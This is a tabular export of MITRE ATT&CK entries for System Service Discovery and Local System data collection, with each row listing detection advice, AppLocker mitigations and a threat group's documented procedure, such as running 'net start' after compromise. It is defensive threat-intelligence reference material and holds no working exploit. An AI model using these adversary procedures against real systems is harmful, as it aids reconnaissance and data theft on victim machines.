97,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['574'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0082|Emissary]] has the capability to execute the command <code>net start</code> to interact with services.[[CiteRef::Emissary Trojan Feb 2016]]'],['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: Emissary,['Discovery'],['Technique/T1007'],['System Service Discovery'],https://attack.mitre.org/wiki/Technique/T1007
98,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['574'],[],"['Process command-line parameters', 'Process monitoring']",['The <code>net start</code> command can be used in [[Software/S0039|Net]] to find information about Windows services.[[CiteRef::Savill 1999]]'],['Threat Group-1314'],"['Threat Group-1314', 'TG-1314']",['G0028'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: Net, net.exe",['Discovery'],['Technique/T1007'],['System Service Discovery'],https://attack.mitre.org/wiki/Technique/T1007
99,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['574'],[],"['Process command-line parameters', 'Process monitoring']",['The <code>net start</code> command can be used in [[Software/S0039|Net]] to find information about Windows services.[[CiteRef::Savill 1999]]'],['Naikon'],['Naikon'],['G0019'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: Net, net.exe",['Discovery'],['Technique/T1007'],['System Service Discovery'],https://attack.mitre.org/wiki/Technique/T1007
100,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['574'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0057|Tasklist]] can be used to discover services running on a system.[[CiteRef::Microsoft Tasklist]]'],['Naikon'],['Naikon'],['G0019'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: Tasklist,['Discovery'],['Technique/T1007'],['System Service Discovery'],https://attack.mitre.org/wiki/Technique/T1007
101,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['574'],[],"['Process command-line parameters', 'Process monitoring']",['The <code>net start</code> command can be used in [[Software/S0039|Net]] to find information about Windows services.[[CiteRef::Savill 1999]]'],['admin@338'],['admin@338'],['G0018'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: Net, net.exe",['Discovery'],['Technique/T1007'],['System Service Discovery'],https://attack.mitre.org/wiki/Technique/T1007
102,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['574'],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0018|admin@338]] actors used the following command following exploitation of a machine with [[Software/S0042|LOWBALL]] malware to obtain information about services: <code>net start >> %temp%\\download</code>[[CiteRef::FireEye admin@338]]'],['admin@338'],['admin@338'],['G0018'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],[],['Discovery'],['Technique/T1007'],['System Service Discovery'],https://attack.mitre.org/wiki/Technique/T1007
103,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['574'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0085|S-Type]] runs the command <code>net start</code> on a victim.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: S-Type,['Discovery'],['Technique/T1007'],['System Service Discovery'],https://attack.mitre.org/wiki/Technique/T1007
104,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['574'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0086|ZLib]] has the ability to discover and manipulate Windows services.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: ZLib,['Discovery'],['Technique/T1007'],['System Service Discovery'],https://attack.mitre.org/wiki/Technique/T1007
105,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['574'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0049|GeminiDuke]] collects information on programs and services on the victim that are configured to automatically run at startup.[[CiteRef::F-Secure The Dukes]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: GeminiDuke,['Discovery'],['Technique/T1007'],['System Service Discovery'],https://attack.mitre.org/wiki/Technique/T1007
106,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['574'],[],"['Process command-line parameters', 'Process monitoring']","['After compromising a victim, [[Group/G0033|Poseidon Group]] discovers all running services.[[CiteRef::Kaspersky Poseidon Group]]']",['Poseidon Group'],['Poseidon Group'],['G0033'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],[],['Discovery'],['Technique/T1007'],['System Service Discovery'],https://attack.mitre.org/wiki/Technique/T1007
107,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['574'],[],"['Process command-line parameters', 'Process monitoring']",['The <code>net start</code> command can be used in [[Software/S0039|Net]] to find information about Windows services.[[CiteRef::Savill 1999]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: Net, net.exe",['Discovery'],['Technique/T1007'],['System Service Discovery'],https://attack.mitre.org/wiki/Technique/T1007
108,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['574'],[],"['Process command-line parameters', 'Process monitoring']",['The <code>net start</code> command can be used in [[Software/S0039|Net]] to find information about Windows services.[[CiteRef::Savill 1999]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: Net, net.exe",['Discovery'],['Technique/T1007'],['System Service Discovery'],https://attack.mitre.org/wiki/Technique/T1007
109,['Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].'],[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","[""When it first starts, [[Software/S0128|BADNEWS]] crawls the victim's local drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt.[[CiteRef::Forcepoint Monsoon]]""]",['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from the local system, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Privileges to access certain files and directories'],Software: BADNEWS,['Collection'],['Technique/T1005'],['Data from Local System'],https://attack.mitre.org/wiki/Technique/T1005
110,['Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].'],[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Group/G0004|Ke3chang]] gathered information and files from local directories for exfiltration.[[CiteRef::Villeneuve et al 2014]]'],['Ke3chang'],['Ke3chang'],['G0004'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from the local system, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Privileges to access certain files and directories'],[],['Collection'],['Technique/T1005'],['Data from Local System'],https://attack.mitre.org/wiki/Technique/T1005
111,['Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].'],[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Group/G0006|APT1]] has collected files from a local victim.[[CiteRef::Mandiant APT1]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from the local system, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Privileges to access certain files and directories'],[],['Collection'],['Technique/T1005'],['Data from Local System'],https://attack.mitre.org/wiki/Technique/T1005
112,['Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].'],[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0079|MobileOrder]] exfiltrates data collected from the victim mobile device.[[CiteRef::Scarlet Mimic Jan 2016]]'],['Scarlet Mimic'],['Scarlet Mimic'],['G0029'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from the local system, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Privileges to access certain files and directories'],Software: MobileOrder,['Collection'],['Technique/T1005'],['Data from Local System'],https://attack.mitre.org/wiki/Technique/T1005
113,['Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].'],[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","['[[Software/S0036|FLASHFLOOD]] searches for interesting files (either a default or customized set of file extensions) on the local system. [[Software/S0036|FLASHFLOOD]] will scan the My Recent Documents, Desktop, Temporary Internet Files, and TEMP directories. [[Software/S0036|FLASHFLOOD]] also collects information stored in the Windows Address Book.[[CiteRef::FireEye APT30]]']",['APT30'],['APT30'],['G0013'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from the local system, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Privileges to access certain files and directories'],Software: FLASHFLOOD,['Collection'],['Technique/T1005'],['Data from Local System'],https://attack.mitre.org/wiki/Technique/T1005
114,['Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].'],[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Group/G0038|Stealth Falcon]] malware gathers data from the local victim system.[[CiteRef::Citizen Lab Stealth Falcon May 2016]]'],['Stealth Falcon'],['Stealth Falcon'],['G0038'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from the local system, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Privileges to access certain files and directories'],[],['Collection'],['Technique/T1005'],['Data from Local System'],https://attack.mitre.org/wiki/Technique/T1005
115,['Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].'],[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Group/G0031|Dust Storm]] has used Android backdoors capable of exfiltrating specific files directly from the infected devices.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from the local system, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Privileges to access certain files and directories'],[],['Collection'],['Technique/T1005'],['Data from Local System'],https://attack.mitre.org/wiki/Technique/T1005
116,['Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].'],[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0048|PinchDuke]] collects user files from the compromised host based on predefined file extensions.[[CiteRef::F-Secure The Dukes]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from the local system, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Privileges to access certain files and directories'],Software: PinchDuke,['Collection'],['Technique/T1005'],['Data from Local System'],https://attack.mitre.org/wiki/Technique/T1005
117,['Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].'],[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0050|CosmicDuke]] steals user files from local hard drives with file extensions that match a predefined list.[[CiteRef::F-Secure Cosmicduke]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from the local system, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Privileges to access certain files and directories'],"Software: CosmicDuke, TinyBaron, ...",['Collection'],['Technique/T1005'],['Data from Local System'],https://attack.mitre.org/wiki/Technique/T1005
118,['Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].'],[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","[""[[Group/G0032|Lazarus Group]] malware IndiaIndia saves information gathered about the victim to a file that is uploaded to one of its 10 C2 servers.[[CiteRef::Novetta Blockbuster Loaders]] [[Group/G0032|Lazarus Group]] malware RomeoDelta copies specified directories from the victim's machine, then archives and encrypts the directories before uploading to its C2 server.[[CiteRef::Novetta Blockbuster RATs]]""]",['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from the local system, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 